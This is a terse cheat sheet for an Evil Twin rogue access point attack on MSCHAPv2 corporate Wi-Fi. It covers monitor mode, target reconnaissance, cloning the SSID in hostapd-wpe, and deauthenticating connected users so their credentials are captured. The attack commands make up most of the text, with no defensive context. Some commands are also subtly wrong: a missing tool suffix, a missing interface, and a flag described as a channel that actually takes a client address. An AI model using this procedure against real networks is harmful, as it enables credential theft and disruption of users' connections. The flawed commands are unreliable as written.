Rogue AP Attack
===============

> General Informations


> If you need several external eth interfaces, connect then at the beginning
> To ensure having wlan0 and wlan1
> And avoid having wlan0mon and then wlan0 when you connect the second one
> It could result in conflicts


> Evil Twin / Hostapd-wpe is used against MSCHAPv2 access points, usually used by companies
> Manually creating a rogue AP for classical WPA/WPA2 requires more configuration


> You might need to patch your hostapd version
https://github.com/aircrack-ng/aircrack-ng/tree/master/patches/wpe/hostapd-wpe

> Evil Twin attack


> 1/ Start monitoring mode
> If you plan to use deauth attack, connect the 2 eth interfaces at the same time
> To avoid having wlan0mon and wlan0 (it can conflict)
sudo airmon-ng start wlan0

> 2/ If process are blocking the monitoring mode, kill them
sudo airmon-ng check kill
sudo kill <PID>

> 3/ Get the target AP (ESSID)
> Your target can have multiples AP, and so multiples MAC addresses
> They can run on differents channels
sudo airodump wlan0mon

> 4/ Then set the target in the configuration file
sudo nano /etc/hostapd-wpe/hostapd-wpe.conf
ssid=<ESSID>

5. Start AP

You will only get people that newly connects to the target AP
If you want to get people already connected, you need to push the attack further with deauth

    sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

6. Start the second ethernet interface

        sudo airmon-ng start wlan1

7. Deauth (In another terminal)

    Based on the differents ESSID and channels found in step 3
    -0 is the number of deauth packet sent

        sudo aireplay-ng -0 10 -a <mac address> -c <channel>
